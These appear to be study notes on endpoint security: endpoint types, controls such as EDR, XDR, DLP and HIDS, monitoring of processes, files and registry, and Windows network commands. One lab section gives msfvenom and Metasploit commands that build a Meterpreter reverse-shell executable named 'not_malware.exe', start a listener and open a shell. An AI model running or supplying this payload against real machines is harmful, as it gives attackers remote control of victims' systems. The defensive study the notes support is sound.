## Endpoints

- **WorkStations**
  - Desktops and laptops
- **Mobile Devices**
  - Smartphones and tablets
- **Servers**
  - Email, Web, Database, File servers, etc
- **IoT Devices**
  - Smart printers, cameras, appliances, etc.
- **Networking Equipment**
  - Routers, switches, firewalls, etc.

---

## Endpoint Security Controls

- **Antivirus / Antimalware**
  - Scans files and activities
  - Matching patterns and signatures
- **Endpoint Detection and Response (EDR)**
  - Real-time monitoring and response
  - Agent-based deployment
  - Monitor process, file, registry, and network activity
- **Extended Detection and Response (XDR)**
  - Integration of multiple security controls and telemetry
  - Runbooks and automated response to routine threats
- **Data Loss Prevention (DPL)**
  - Protect sensitive data at rest, transit, and in processing
  - Access controls, data masking, prevention
- **User and Entity Behavior Analytics (UBA)**
  - Monitoring user behavior patterns
  - Detect deviations from historic and contextual baseline
  - Insider threats, account compromise, data ex-filtration
- **HIDS/HIPS**
  - Host-based Intrusion Detection System (HIDS)
  - Host-based Intrusion Prevention System (HIPS)
- **Host-based Firewall**
  - Controls incoming and outgoing traffic on a host

---

## Endpoint Security Monitoring

- **Process Execution**
  - Monitoring running processes
  - Executable files, PIDS, command line arguments
  - Parents-Child process hierarchy
- **File System Changes**
  - Creation, Modification, deletion
  - File Integrity Monitoring (FIM)
- **Network Connections**
  - Traffic and connections initiated from the endpoint
  - Associated processes and executables
- **Registry Modifications**
  - Monitoring registry keys and values
  - Detect backdoors, persistence, detection evasion

---

## Create a Malware for testing

```bash
# Create the .exe file
$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.83.128 LPORT=4444 -f exe -o not_malware.exe


$ use exploit/multi/handler
$ set PAYLOAD windows/meterpreter/reverse_tcp
$ set LHOST eth0
$ set LPORT 4444
$ exploit
$ shell


$ python3 -m http.server 8000

$ scp kali@<ip>:/home/kali/malware/not_malware.exe ./
```

## Windows Network Analysis

```bash
$ net share
$ net session
$ net use X:
``` 

**NetStat**


```bash
$ netstat
$ netstat -anob
```
